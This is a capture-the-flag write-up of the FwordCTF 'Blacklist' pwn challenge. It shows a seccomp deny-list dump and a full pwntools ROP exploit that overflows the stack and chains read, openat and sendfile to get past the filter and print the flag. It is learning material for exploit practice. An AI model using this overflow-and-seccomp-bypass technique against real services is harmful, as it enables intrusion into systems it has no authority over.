## FwordCTF Blacklist Writeup
#### Tags: pwn, seccomp bypass, rop

We are given a statically linked binary:

```shell
$ file ./blacklist
./blacklist: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=8231fd8232118e3b92ca37d041e1da3ab1daf4d9, for GNU/Linux 3.2.0, stripped
```

From analzying the binary, we can see it uses seccomp to restrict syscalls, then waits for input:

```shell
$ strace ./blacklist
...
seccomp(SECCOMP_SET_MODE_FILTER, 0, {len=24, filter=0x902350}) = 0
read(0, 
```

We can easily overflow, find the offset and control rip, but due to seccomp, it will be much harder to read the flag.

```shell
$ ./blacklist
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Let's analyze the seccomp profile using [seccomp-tools](https://github.com/david942j/seccomp-tools):

```shell
$ seccomp-tools dump ./blacklist
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x15 0xc000003e  if (A != ARCH_X86_64) goto 0023
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x12 0xffffffff  if (A != 0xffffffff) goto 0023
 0005: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0023
 0006: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0023
 0007: 0x15 0x0f 0x00 0x00000012  if (A == pwrite64) goto 0023
 0008: 0x15 0x0e 0x00 0x00000014  if (A == writev) goto 0023
 0009: 0x15 0x0d 0x00 0x00000038  if (A == clone) goto 0023
 0010: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0023
 0011: 0x15 0x0b 0x00 0x0000003a  if (A == vfork) goto 0023
 0012: 0x15 0x0a 0x00 0x0000003b  if (A == execve) goto 0023
 0013: 0x15 0x09 0x00 0x0000003e  if (A == kill) goto 0023
 0014: 0x15 0x08 0x00 0x00000065  if (A == ptrace) goto 0023
 0015: 0x15 0x07 0x00 0x000000c8  if (A == tkill) goto 0023
 0016: 0x15 0x06 0x00 0x00000113  if (A == splice) goto 0023
 0017: 0x15 0x05 0x00 0x00000128  if (A == pwritev) goto 0023
 0018: 0x15 0x04 0x00 0x00000130  if (A == open_by_handle_at) goto 0023
 0019: 0x15 0x03 0x00 0x00000135  if (A == getcpu) goto 0023
 0020: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0023
 0021: 0x15 0x01 0x00 0x00000148  if (A == pwritev2) goto 0023
 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0023: 0x06 0x00 0x00 0x00000000  return KILL
 ```
All the syscalls listed above are blocked.
Also attempting to switch to 32 bit mode to use 32 bit syscalls is not allowed.

We need to bypass the seccomp filter and read the flag somehow (it's path is known). After looking at the [amd64 syscall table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), we can find some useful syscalls that allow us to read the flag:
 * read - to read the path of the flag into a known address
 * openat - to open the flag file and get the fd
 * sendfile - to transfer data between file descriptors (we can transfer to fd 1 stdout)

Now because the binary is statically linked, we will have plenty of rop gadgets to use. I chose to write a rop chain that uses only these syscalls. Another approach is to write custom shellcode, then use mprotect to mark the section of the shellcode as executable, and execute it.

Before I wrote the rop chain, I tested the syscalls in a [c program](idea.c) in order to test it easily:
```c
#include <fcntl.h>
#include <sys/sendfile.h>

int main() {
    // read(0, RW_ADDR, 900); // write path of flag to known address
    int fd = openat(0, "/path/to/flag.txt", O_RDONLY); // imagine that RW_ADDR points to the string "/path/to/flag.txt"
    sendfile(1, fd, 0, 0xffff);
    return 0;
}
```

Now the [final exploit](solve.py):
```py
from pwn import *

context(arch="amd64")
elf = ELF("./blacklist")

DEBUG = False
REMOTE = True

if DEBUG:
    p = gdb.debug("./blacklist", gdbscript="""
    b *0x4017b6
    continue
    """)
elif REMOTE:
    p = remote("blacklist.fword.wtf",1236)
else:
    p = process(elf.path)

offset = 72

read_n = 0
openat_n = 257 
sendfile_n = 40

pop_rdi_ret = 0x00000000004017b6#: pop rdi; ret;
pop_rsi_ret = 0x00000000004024f6#: pop rsi; ret;
pop_rdx_ret = 0x0000000000401db2#: pop rdx; ret;
pop_rax_ret = 0x0000000000401daf#: pop rax; ret;
pop_r10_ret = 0x0000000000401db1#: pop r10; ret;
syscall_ret = 0x000000000041860c#: syscall; ret;


string_addr = 0x004d1260
path_str = "/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt\x00"

# first payload to read string from stdin
payload = b""
payload += b"A"*offset 
payload += p64(pop_rdi_ret)
payload += p64(0) # arg1 fd
payload += p64(pop_rsi_ret)
payload += p64(string_addr) # arg2 buf
payload += p64(pop_rdx_ret)
payload += p64(300) # arg3 count
payload += p64(pop_rax_ret)
payload += p64(read_n)
payload += p64(syscall_ret) # read

# second payload to open the flag using openat
payload += p64(pop_rdi_ret)
payload += p64(0) # arg1 (doesn't matter)
payload += p64(pop_rsi_ret) 
payload += p64(string_addr) # arg2 path
payload += p64(pop_rdx_ret)
payload += p64(0) # arg3
payload += p64(pop_rax_ret)
payload += p64(openat_n)
payload += p64(syscall_ret) # openat

flag_fd = 3 # new fd of the flag will always be 3

# third payload to write flag to stdout using sendfile
payload += p64(pop_rdi_ret)
payload += p64(1) # arg1 dst fd: stdout
payload += p64(pop_rsi_ret)
payload += p64(flag_fd) # arg2 src fd: flag_fd
payload += p64(pop_rdx_ret)
payload += p64(0) # arg3 offset
payload += p64(pop_r10_ret)
payload += p64(0xffff) # arg4 count
payload += p64(pop_rax_ret)
payload += p64(sendfile_n)
payload += p64(syscall_ret) # sendfile

p.sendline(payload)
p.sendline(path_str)
p.interactive()
```

And we get the flag!
**FwordCTF{th3_n4M3_1s_El1Z4be7h_K33n}**

Overall a really fun challenge.
